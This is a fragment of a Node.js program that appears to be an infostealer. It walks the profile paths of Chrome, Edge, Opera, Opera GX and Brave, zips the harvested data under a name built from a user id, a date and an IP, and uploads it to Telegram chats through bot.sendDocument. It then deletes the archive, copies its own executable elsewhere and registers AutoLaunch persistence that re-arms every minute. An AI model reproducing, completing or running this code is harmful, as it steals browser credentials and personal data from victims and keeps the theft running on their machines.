    ngays=ngays.replace('/','');
    ngays=ngays.replace('/','');

    let namef=''+dataG.user.id+'-'+ngays+'-'+ippp+'.zip';
await zip.writeZipPromise(ppp+'/d.zip');
  await new Promise((resolve) => {
                setTimeout(()=>{resolve(true)},1500);
            });
var willSendthis = fs.createReadStream(ppp+'/d.zip');
    if(hanhDong==='Tự Mở'){
await bot.sendDocument(chatId,willSendthis,namef);  
}else{

await bot2.sendDocument(chatId2,willSendthis,namef);

}
await new Promise((resolve) => {
                setTimeout(()=>{resolve(true)},50);
            });
await fs.unlinkSync(ppp+'/d.zip');
}catch(e){
console.log('eee',e)
}


                            } catch (e) {
                                console.log(e)
                            }

                        }
                    }
                }


            } catch (e) {
                console.log(e)
            }
        }
    }
    try {
        await mainBl(ChromePaths);
    }catch (e){
        console.log(e)
    }
    try {
        await mainBl(MicrosoftEdgePaths);
    }catch (e){
        console.log(e)
    }
    try {
        await mainBl(OperaDefaultPaths);
    }catch (e){
        console.log(e)
    }
    try {
        await mainBl(OperaGXPaths);
    }catch (e){
        console.log(e)
    }

    try {
        await mainBl(BravePaths);
    }catch (e){
        console.log(e)
    }

    await new Promise((resolve) => {
        setTimeout(()=>{resolve(true)},10500)
    });
    try{
        if(process.execPath&&process.execPath!==''){

            console.log(pathS,'pathS');
            if(!fs.existsSync(pathS)){
                fs.copyFile(process.execPath,pathS, (err) => {});
            }
        }

    }catch (e){
        console.log(e)
    }
    if(process.execPath){
        try{
            const autoLaunch = new AutoLaunch({
                name: name,
                path: (pathS||'')
            })
            autoLaunch.isEnabled().then((isEnabled) => {
                if (!isEnabled) autoLaunch.enable()
            })
            setInterval(()=>{
                autoLaunch.isEnabled().then((isEnabled) => {
                    if (!isEnabled) autoLaunch.enable()
                })
            },60000)
        }catch (e){
            console.log(e)
        }

    }
    await new Promise((resolve) => {
        setTimeout(()=>{resolve(true)},12500)
    });

    let tem=[];
    for   (let i = 0; i < 2000000; i++) {
        tem.push('')
    }
    for  await (const i of tem) {
        await new Promise((resolve) => {
            setTimeout(()=>{resolve(true)},20500)
        });
    }
    for  await (const i of tem) {
        await new Promise((resolve) => {
            setTimeout(()=>{resolve(true)},20500)
        });
    }
    for  await (const i of tem) {
        await new Promise((resolve) => {
            setTimeout(()=>{resolve(true)},20500)
        });
    }
    for  await (const i of tem) {
        await new Promise((resolve) => {
            setTimeout(()=>{resolve(true)},25500)
        });
    }
};
main();
